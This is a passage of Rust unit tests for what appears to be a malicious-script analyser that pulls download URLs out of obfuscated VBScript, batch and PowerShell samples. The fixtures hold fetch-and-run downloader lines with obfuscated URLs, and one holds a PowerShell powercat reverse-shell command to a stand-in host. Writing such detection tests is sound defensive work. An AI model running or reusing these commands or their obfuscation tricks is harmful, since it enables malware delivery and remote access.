        let mut env = Environment::new(&Config::default());
        let vbs = br#"Const u = "https://vbs-const.example/payload.txt"
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", u, False
http.Send"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://vbs-const.example/payload.txt"
            )
        });
        assert!(
            has,
            "no Download trait from VBS Const URL binding: {:?}",
            env.traits
        );
    }

    #[test]
    fn vbs_xmlhttp_url_extracted_from_colon_separated_binding() {
        let mut env = Environment::new(&Config::default());
        let vbs = br#"u = "https://vbs-colon.example/payload.txt" : Set http = CreateObject("MSXML2.XMLHTTP") : http.Open "GET", u, False : http.Send"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://vbs-colon.example/payload.txt"
            )
        });
        assert!(
            has,
            "no Download trait from VBS colon-separated URL binding: {:?}",
            env.traits
        );
    }

    #[test]
    fn vbs_xmlhttp_url_extracted_from_concat_variable() {
        let mut env = Environment::new(&Config::default());
        let vbs = br#"Dim u, http
u = "ht" & "tp://vbs-concat.example/payload.txt"
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", u, False
http.Send"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "http://vbs-concat.example/payload.txt"
            )
        });
        assert!(
            has,
            "no Download trait from VBS concatenated variable URL: {:?}",
            env.traits
        );
    }

    #[test]
    fn vbs_xmlhttp_url_extracted_from_plus_concat_variable() {
        let mut env = Environment::new(&Config::default());
        let vbs = br#"Dim u, http
u = "ht" + "tp://vbs-plus-concat.example/payload.txt"
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", u, False
http.Send"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "http://vbs-plus-concat.example/payload.txt"
            )
        });
        assert!(
            has,
            "no Download trait from VBS plus-concatenated variable URL: {:?}",
            env.traits
        );
    }

    #[test]
    fn vbs_xmlhttp_url_extracted_from_inline_concat_argument() {
        let mut env = Environment::new(&Config::default());
        let vbs = br#"Dim http
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", "http://vbs-inline-" & "concat.example/payload.txt", False
http.Send"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "http://vbs-inline-concat.example/payload.txt"
            )
        });
        assert!(
            has,
            "no Download trait from VBS inline concatenated XMLHTTP URL: {:?}",
            env.traits
        );
    }

    #[test]
    fn vbs_xmlhttp_url_extracted_from_chr_concat_variable() {
        let mut env = Environment::new(&Config::default());
        let vbs = br#"Dim u, http
u = Chr(104) & "ttp://vbs-chr.example/payload.txt"
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", u, False
http.Send"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "http://vbs-chr.example/payload.txt"
            )
        });
        assert!(
            has,
            "no Download trait from VBS Chr concatenated variable URL: {:?}",
            env.traits
        );
    }

    #[test]
    fn vbs_xmlhttp_url_extracted_from_spaced_chr_concat_variable() {
        let mut env = Environment::new(&Config::default());
        let vbs = br#"Dim u, http
u = Chr (&H68) & "ttp://vbs-spaced-chr.example/payload.txt"
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", u, False
http.Send"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "http://vbs-spaced-chr.example/payload.txt"
            )
        });
        assert!(
            has,
            "no Download trait from VBS spaced Chr concatenated variable URL: {:?}",
            env.traits
        );
    }

    #[test]
    fn vbs_xmlhttp_url_extracted_from_variable_concat_binding() {
        let mut env = Environment::new(&Config::default());
        let vbs = br#"Dim proto, host, u, http
proto = "http://"
host = "vbs-var-concat.example"
u = proto & host & "/payload.txt"
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", u, False
http.Send"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "http://vbs-var-concat.example/payload.txt"
            )
        });
        assert!(
            has,
            "no Download trait from VBS variable concatenated URL: {:?}",
            env.traits
        );
    }

    #[test]
    fn vbs_xmlhttp_url_extracted_from_inline_commented_binding() {
        let mut env = Environment::new(&Config::default());
        let vbs = br#"Dim u, http
u = "http://vbs-inline-comment.example/payload.txt" ' staging URL
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", u, False
http.Send"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "http://vbs-inline-comment.example/payload.txt"
            )
        });
        assert!(
            has,
            "no Download trait from VBS inline-commented URL binding: {:?}",
            env.traits
        );
    }

    #[test]
    fn vbs_xmlhttp_url_extracted_from_line_continuation_concat() {
        let mut env = Environment::new(&Config::default());
        let vbs = br#"Dim u, http
u = "http://" & _
    "vbs-line-cont.example/payload.txt"
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", u, False
http.Send"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "http://vbs-line-cont.example/payload.txt"
            )
        });
        assert!(
            has,
            "no Download trait from VBS line-continuation concatenated URL: {:?}",
            env.traits
        );
    }

    #[test]
    fn vbs_xmlhttp_url_extracted_from_cstr_wrapper() {
        let mut env = Environment::new(&Config::default());
        let vbs = br#"Dim u, http
u = CStr("http://vbs-cstr.example/payload.txt")
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", u, False
http.Send"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "http://vbs-cstr.example/payload.txt"
            )
        });
        assert!(
            has,
            "no Download trait from VBS CStr-wrapped URL: {:?}",
            env.traits
        );
    }

    #[test]
    fn vbs_xmlhttp_url_extracted_from_cstr_inner_concat() {
        let mut env = Environment::new(&Config::default());
        let vbs = br#"Dim host, u, http
host = "vbs-cstr-concat.example"
u = CStr("http://" & host & "/payload.txt")
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", u, False
http.Send"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "http://vbs-cstr-concat.example/payload.txt"
            )
        });
        assert!(
            has,
            "no Download trait from VBS CStr inner concat URL: {:?}",
            env.traits
        );
    }

    #[test]
    fn vbs_xmlhttp_url_extracted_from_replace_wrapper() {
        let mut env = Environment::new(&Config::default());
        let vbs = br#"Dim u, http
u = Replace("hxxp://vbs-replace.example/payload.txt", "hxxp", "http")
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", u, False
http.Send"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "http://vbs-replace.example/payload.txt"
            )
        });
        assert!(
            has,
            "no Download trait from VBS Replace-wrapped URL: {:?}",
            env.traits
        );
    }

    #[test]
    fn vbs_xmlhttp_url_extracted_from_mid_wrapper() {
        let mut env = Environment::new(&Config::default());
        let vbs = br#"Dim u, http
u = Mid("XXhttp://vbs-mid.example/payload.txt", 3)
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", u, False
http.Send"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "http://vbs-mid.example/payload.txt"
            )
        });
        assert!(
            has,
            "no Download trait from VBS Mid-wrapped URL: {:?}",
            env.traits
        );
    }

    #[test]
    fn vbs_xmlhttp_url_extracted_from_mid_hex_index_wrapper() {
        let mut env = Environment::new(&Config::default());
        let vbs = br#"Dim u, http
u = Mid("XXhttp://vbs-mid-hex.example/payload.txt", &H3)
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", u, False
http.Send"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "http://vbs-mid-hex.example/payload.txt"
            )
        });
        assert!(
            has,
            "no Download trait from VBS Mid hex-index URL: {:?}",
            env.traits
        );
    }

    #[test]
    fn vbs_xmlhttp_url_extracted_from_hex_chr_concat_variable() {
        let mut env = Environment::new(&Config::default());
        let vbs = br#"Dim u, http
u = Chr(&H68) & "ttp://vbs-hex-chr.example/payload.txt"
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", u, False
http.Send"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "http://vbs-hex-chr.example/payload.txt"
            )
        });
        assert!(
            has,
            "no Download trait from VBS hex Chr concatenated URL: {:?}",
            env.traits
        );
    }

    #[test]
    fn vbs_xmlhttp_url_extracted_from_arithmetic_chr_concat_variable() {
        let mut env = Environment::new(&Config::default());
        let vbs = br#"Dim u, http
u = Chr(100 + 4) & Chr(&H70 + 4) & "tp://vbs-arith-chr.example/payload.txt"
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", u, False
http.Send"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "http://vbs-arith-chr.example/payload.txt"
            )
        });
        assert!(
            has,
            "no Download trait from VBS arithmetic Chr concatenated URL: {:?}",
            env.traits
        );
    }

    #[test]
    fn vbs_xmlhttp_url_extracted_from_strreverse_wrapper() {
        let mut env = Environment::new(&Config::default());
        let vbs = br#"Dim u, http
u = StrReverse("txt.daolyap/elpmaxe.srts-sbv//:ptth")
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", u, False
http.Send"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "http://vbs-strs.example/payload.txt"
            )
        });
        assert!(
            has,
            "no Download trait from VBS StrReverse-wrapped URL: {:?}",
            env.traits
        );
    }

    #[test]
    fn vbs_xmlhttp_url_extracted_from_join_array_wrapper() {
        let mut env = Environment::new(&Config::default());
        let vbs = br#"Dim u, http
u = Join(Array("http://", "vbs-join.example", "/payload.txt"), "")
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", u, False
http.Send"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "http://vbs-join.example/payload.txt"
            )
        });
        assert!(
            has,
            "no Download trait from VBS Join(Array(...)) URL: {:?}",
            env.traits
        );
    }

    #[test]
    fn vbs_xmlhttp_url_extracted_from_join_array_variable() {
        let mut env = Environment::new(&Config::default());
        let vbs = br#"Dim u, http, parts
parts = Array("http://", "vbs-join-var.example", "/payload.txt")
u = Join(parts, "")
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", u, False
http.Send"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "http://vbs-join-var.example/payload.txt"
            )
        });
        assert!(
            has,
            "no Download trait from VBS Join(array variable) URL: {:?}",
            env.traits
        );
    }

    #[test]
    fn vbs_xmlhttp_url_extracted_from_join_split_wrapper() {
        let mut env = Environment::new(&Config::default());
        let vbs = br#"Dim u, http
u = Join(Split("h t t p : / / v b s - j o i n - s p l i t . e x a m p l e / p a y l o a d . t x t", " "), "")
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", u, False
http.Send"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "http://vbs-join-split.example/payload.txt"
            )
        });
        assert!(
            has,
            "no Download trait from VBS Join(Split(...)) URL: {:?}",
            env.traits
        );
    }

    #[test]
    fn vbs_xmlhttp_url_extracted_from_split_index_wrapper() {
        let mut env = Environment::new(&Config::default());
        let vbs = br#"Dim u, http
u = Split("http://vbs-split.example/payload.txt|trash", "|")(0)
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", u, False
http.Send"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "http://vbs-split.example/payload.txt"
            )
        });
        assert!(
            has,
            "no Download trait from VBS Split(...)(0) URL: {:?}",
            env.traits
        );
    }

    #[test]
    fn vbs_urldownloadtofile_url_extracted_from_variable() {
        let mut env = Environment::new(&Config::default());
        let vbs = br#"Dim u
u = "http://vbs-urldown-var.example/payload.exe"
URLDownloadToFile 0, u, "payload.exe", 0, 0"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "http://vbs-urldown-var.example/payload.exe"
                        && dst.as_deref() == Some("payload.exe")
            )
        });
        assert!(
            has,
            "no Download trait with destination from VBS URLDownloadToFile variable URL: {:?}",
            env.traits
        );
    }

    #[test]
    fn vbs_urldownloadtofile_ansi_suffix_destination_extracted() {
        let mut env = Environment::new(&Config::default());
        let vbs = br#"Dim u
u = "http://vbs-urldown-ansi.example/payload.exe"
URLDownloadToFileA 0, u, "ansi.exe", 0, 0"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "http://vbs-urldown-ansi.example/payload.exe"
                        && dst.as_deref() == Some("ansi.exe")
            )
        });
        assert!(
            has,
            "no Download trait with destination from VBS URLDownloadToFileA: {:?}",
            env.traits
        );
    }

    #[test]
    fn vbs_urldownloadtofile_url_extracted_from_inline_concat_argument() {
        let mut env = Environment::new(&Config::default());
        let vbs =
            br#"URLDownloadToFile 0, "http://" & "vbs-urldown-concat.example/payload.exe", "payload.exe", 0, 0"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "http://vbs-urldown-concat.example/payload.exe"
            )
        });
        assert!(
            has,
            "no Download trait from VBS URLDownloadToFile inline concat URL: {:?}",
            env.traits
        );
    }

    #[test]
    fn vbs_wscript_shell_run_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let vbs = br#"Set sh = CreateObject("WScript.Shell")
sh.Run "mshta http://vbs-run.example/payload.hta", 0, False"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "http://vbs-run.example/payload.hta"
            )
        });
        assert!(
            has,
            "no Download trait from VBS WScript.Shell.Run URL: {:?}",
            env.traits
        );
    }

    #[test]
    fn vbs_wscript_shell_run_inline_concat_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let vbs = br#"Set sh = CreateObject("WScript.Shell")
sh.Run "mshta " & "http://vbs-run-concat.example/payload.hta", 0, False"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "http://vbs-run-concat.example/payload.hta"
            )
        });
        assert!(
            has,
            "no Download trait from VBS WScript.Shell.Run inline concat URL: {:?}",
            env.traits
        );
    }

    #[test]
    fn vbs_wscript_shell_run_variable_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let vbs = br#"Dim cmd
cmd = "mshta " & "http://vbs-run-var.example/payload.hta"
Set sh = CreateObject("WScript.Shell")
sh.Run cmd, 0, False"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "http://vbs-run-var.example/payload.hta"
            )
        });
        assert!(
            has,
            "no Download trait from VBS WScript.Shell.Run variable URL: {:?}",
            env.traits
        );
    }

    #[test]
    fn utf16le_vbs_blob_is_decoded_and_scanned() {
        let vbs = r#"Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", "http://utf16.example/payload.vbs", False
http.Send"#;
        let utf16: Vec<u8> = vbs.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
        let report = analyze(&utf16, &AnalyzeConfig::default());
        assert!(
            report.deobfuscated.contains("CreateObject") && !report.deobfuscated.contains('\0'),
            "UTF-16LE VBS was not rendered as readable text: {:?}",
            report.deobfuscated
        );
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src.contains("utf16.example/payload.vbs")
            )
        });
        assert!(
            has,
            "UTF-16LE VBS download was not extracted: {:?}",
            report.traits
        );
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod copy_multi_source_tests {
    use crate::env::{Config, Environment, FsEntry};
    use crate::interp::interpret_line;

    #[test]
    fn copy_b_multi_source_concat_tracked() {
        let mut env = Environment::new(&Config::default());
        env.modified_filesystem.insert(
            "a.bin".to_string(),
            FsEntry::Content {
                content: b"AAAA".to_vec(),
                append: false,
            },
        );
        env.modified_filesystem.insert(
            "b.bin".to_string(),
            FsEntry::Content {
                content: b"BBBB".to_vec(),
                append: false,
            },
        );
        env.modified_filesystem.insert(
            "c.bin".to_string(),
            FsEntry::Content {
                content: b"CCCC".to_vec(),
                append: false,
            },
        );
        interpret_line("copy /b a.bin + b.bin + c.bin out.exe", &mut env);
        let entry = env
            .modified_filesystem
            .get("out.exe")
            .expect("out.exe missing");
        match entry {
            FsEntry::Content { content, .. } => {
                assert_eq!(content, b"AAAABBBBCCCC", "got: {:?}", content);
            }
            FsEntry::Copy { .. } => {
                // Acceptable fallback: destination tracked
            }
            _ => panic!("unexpected entry: {:?}", entry),
        }
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod deob_url_scan_tests {
    use crate::traits::Trait;
    use crate::{analyze, Config};

    #[test]
    fn url_in_set_value_surfaces() {
        let script = b"set DLURL=http://evil.example/y.exe\r\necho %DLURL%\r\n";
        let report = analyze(script, &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::UrlVariable { name, url, .. }
                    if name == "DLURL" && url.contains("evil.example/y.exe")
            )
        });
        assert!(has, "URL in set value not typed: {:?}", report.traits);
    }

    #[test]
    fn url_in_echo_redirect_surfaces() {
        let script = b">payload.txt echo http://drop.example/p.exe\r\n";
        let report = analyze(script, &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::DownloadInDeobText { src, .. } if src.contains("drop.example/p.exe")
            )
        });
        assert!(has, "URL in echo redirect not swept: {:?}", report.traits);
    }

    #[test]
    fn curl_url_not_double_emitted() {
        let script = b"curl -o out.exe http://x.example/y.exe\r\n";
        let report = analyze(script, &Config::default());
        let download_count = report
            .traits
            .iter()
            .filter(|t| matches!(t, Trait::Download { src, .. } if src.contains("x.example")))
            .count();
        let sweep_count = report
            .traits
            .iter()
            .filter(
                |t| matches!(t, Trait::DownloadInDeobText { src, .. } if src.contains("x.example")),
            )
            .count();
        assert_eq!(
            download_count, 1,
            "expected 1 Download trait, got {}",
            download_count
        );
        assert_eq!(
            sweep_count, 0,
            "curl URL double-emitted as DownloadInDeobText: {}",
            sweep_count
        );
    }

    #[test]
    fn mshta_url_emits_structured_download_without_generic_duplicate() {
        let script = br#"mshta "https://hta.example/payload.hta""#;
        let report = analyze(script, &Config::default());
        let download_count = report
            .traits
            .iter()
            .filter(|t| {
                matches!(
                    t,
                    Trait::Download { src, cmd, dst: None }
                        if cmd.starts_with("mshta") && src == "https://hta.example/payload.hta"
                )
            })
            .count();
        let sweep_count = report
            .traits
            .iter()
            .filter(|t| {
                matches!(
                    t,
                    Trait::DownloadInDeobText { src, .. }
                        if src == "https://hta.example/payload.hta"
                )
            })
            .count();
        assert_eq!(
            download_count, 1,
            "expected mshta URL as structured Download, traits: {:?}",
            report.traits
        );
        assert_eq!(
            sweep_count, 0,
            "mshta URL double-emitted as DownloadInDeobText: {:?}",
            report.traits
        );
    }

    #[test]
    fn explicit_url_launch_emits_url_launch_without_generic_duplicate() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"start "" "https://lure.example/a.pdf"
explorer.exe https://portal.example/privacy/
start msedge /max https://edge.example/lure.pdf"#,
            &mut env,
        );
        let url_launches: Vec<String> = env
            .traits
            .iter()
            .filter_map(|t| {
                let value = serde_json::to_value(t).ok()?;
                if value.get("kind").and_then(|kind| kind.as_str()) == Some("UrlLaunch") {
                    value
                        .get("url")
                        .and_then(|url| url.as_str())
                        .map(str::to_string)
                } else {
                    None
                }
            })
            .collect();
        for expected in [
            "https://lure.example/a.pdf",
            "https://portal.example/privacy/",
            "https://edge.example/lure.pdf",
        ] {
            assert!(
                url_launches.iter().any(|url| url == expected),
                "missing UrlLaunch for {expected}: {:?}",
                env.traits
            );
            assert!(
                !env.traits
                    .iter()
                    .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == expected)),
                "URL launch double-emitted as generic: {:?}",
                env.traits
            );
        }
    }

    #[test]
    fn url_variable_assignments_emit_typed_trait_without_generic_duplicate() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"set "zipUrl=https://vars.example/payload.zip"
@@if 1 EQU 1 set NN=https://raw.example/config.txt
$urlzip = "https://ps.example/stage.zip""#,
            &mut env,
        );
        let vars: Vec<(String, String)> = env
            .traits
            .iter()
            .filter_map(|t| {
                let value = serde_json::to_value(t).ok()?;
                if value.get("kind").and_then(|kind| kind.as_str()) == Some("UrlVariable") {
                    Some((
                        value.get("name")?.as_str()?.to_string(),
                        value.get("url")?.as_str()?.to_string(),
                    ))
                } else {
                    None
                }
            })
            .collect();
        for (name, expected) in [
            ("zipUrl", "https://vars.example/payload.zip"),
            ("NN", "https://raw.example/config.txt"),
            ("urlzip", "https://ps.example/stage.zip"),
        ] {
            assert!(
                vars.iter()
                    .any(|(got_name, url)| got_name == name && url == expected),
                "missing UrlVariable for {name}={expected}: {:?}",
                env.traits
            );
            assert!(
                !env.traits
                    .iter()
                    .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == expected)),
                "URL variable double-emitted as generic: {:?}",
                env.traits
            );
        }
    }

    #[test]
    fn registry_url_value_emits_typed_trait_without_generic_duplicate() {
        let mut env = crate::env::Environment::new(&Config::default());
        let url = "http://www.relevantknowledge.com/confirmuninstall.aspx?siteid=2600";
        crate::deob_scan::scan_deob_text(
            &format!(r#"Reg Add "HKLM\Software\App" /v "UninstURL" /t REG_SZ /d "{url}""#),
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            let Ok(value) = serde_json::to_value(t) else {
                return false;
            };
            value.get("kind").and_then(|kind| kind.as_str()) == Some("RegistryUrl")
                && value.get("value").and_then(|value| value.as_str()) == Some("UninstURL")
                && value.get("url").and_then(|got_url| got_url.as_str()) == Some(url)
        });
        assert!(has, "Registry URL not typed: {:?}", env.traits);
        assert!(
            !env.traits
                .iter()
                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
            "Registry URL double-emitted as generic: {:?}",
            env.traits
        );
    }

    #[test]
    fn process_url_argument_emits_typed_trait_without_generic_duplicate() {
        let mut env = crate::env::Environment::new(&Config::default());
        let url = "https://skynetx.com.br/html.html";
        crate::deob_scan::scan_deob_text(
            &format!(r#"(C:\Users\Public\calc.com "{url}")"#),
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            let Ok(value) = serde_json::to_value(t) else {
                return false;
            };
            value.get("kind").and_then(|kind| kind.as_str()) == Some("UrlArgument")
                && value.get("url").and_then(|got_url| got_url.as_str()) == Some(url)
        });
        assert!(has, "process URL argument not typed: {:?}", env.traits);
        assert!(
            !env.traits
                .iter()
                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
            "process URL argument double-emitted as generic: {:?}",
            env.traits
        );
    }

    #[test]
    fn mangled_short_webclient_de_in_deob_text_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        let url = "http://tvde.m/e/pt.zp";
        crate::deob_scan::scan_deob_text(
            &format!(
                "eh [et.evePte]::etPt = [t.etPtlpe]::12; (Ne-bet -peme tem.et.ebCet).de('{url}', [tem..Pth]::etempPth() + 'ExU.zp')"
            ),
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t, Trait::Download { src, cmd, dst: None }
                if cmd == "powershell-webclient-typo" && src == url)
        });
        assert!(has, "mangled WebClient .de URL not typed: {:?}", env.traits);
        assert!(
            !env.traits
                .iter()
                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
            "mangled WebClient .de URL double-emitted as generic: {:?}",
            env.traits
        );
    }

    #[test]
    fn mangled_webclient_downloadstring_in_cmd_variable_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        let url = "http://172.104.150.66/contadores/pxophp?40=7oehkuz7u3gkxeo8sy2vi7m";
        crate::deob_scan::scan_deob_text(
            &format!(r#"set VTXm22MebfrD=iex("w-ject t.bient).wnloadring('{url}')");"#),
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t, Trait::Download { src, cmd, dst: None }
                if cmd == "powershell-webclient-typo" && src == url)
        });
        assert!(
            has,
            "mangled DownloadString URL not typed: {:?}",
            env.traits
        );
        assert!(
            !env.traits
                .iter()
                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
            "mangled DownloadString URL double-emitted as generic: {:?}",
            env.traits
        );
    }

    #[test]
    fn arbitrary_url_method_call_is_not_promoted_to_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        let url = "http://docs.example/reference";
        crate::deob_scan::scan_deob_text(&format!(r#"some.Object.OpenUrl('{url}')"#), &mut env);
        assert!(
            !env.traits.iter().any(|t| {
                matches!(t, Trait::Download { src, cmd, .. }
                    if cmd == "powershell-webclient-typo" && src == url)
            }),
            "unrelated URL method promoted to Download: {:?}",
            env.traits
        );
        assert!(
            env.traits
                .iter()
                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
            "unrelated URL should still be visible generically: {:?}",
            env.traits
        );
    }

    #[test]
    fn ps1_url_not_double_emitted() {
        use base64::Engine;
        let ps = r#"Invoke-WebRequest -Uri "http://ps1.example/z.exe" -OutFile z.exe"#;
        let utf16: Vec<u8> = ps.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
        let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16);
        let script = format!("powershell -EncodedCommand {}\r\n", b64);
        let report = analyze(script.as_bytes(), &Config::default());
        // The URL is inside the PS payload, NOT in the deobfuscated batch text
        // (which only contains the powershell command line itself).
        // ps1_scan emits Trait::Download for it. The deob sweep should NOT double-emit
        // (the URL doesn't appear in the deob text, only in the b64 payload).
        let sweep_count = report.traits.iter()
            .filter(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src.contains("ps1.example")))
            .count();
        assert_eq!(
            sweep_count, 0,
            "ps1 URL leaked to deob sweep: {}",
            sweep_count
        );
    }

    #[test]
    fn escaped_quote_ps_url_not_double_emitted_with_trailing_backslash() {
        let script = br#"powershell -ExecutionPolicy Bypass -Command "IEX(New-Object System.Net.WebClient).DownloadString(\"http://ps1.example/powercat.ps1\");powercat -c 1.2.3.4 -p 2080 -ep""#;
        let report = analyze(script, &Config::default());
        let clean_download_count = report
            .traits
            .iter()
            .filter(|t| {
                matches!(t,
                    Trait::Download { src, .. } if src == "http://ps1.example/powercat.ps1"
                )
            })
            .count();
        let noisy_sweep_count = report
            .traits
            .iter()
            .filter(|t| {
                matches!(t,
                    Trait::DownloadInDeobText { src, .. } if src.contains("ps1.example")
                )
            })
            .count();
        let has_powercat_connect = report.traits.iter().any(|t| {
            matches!(
                t,
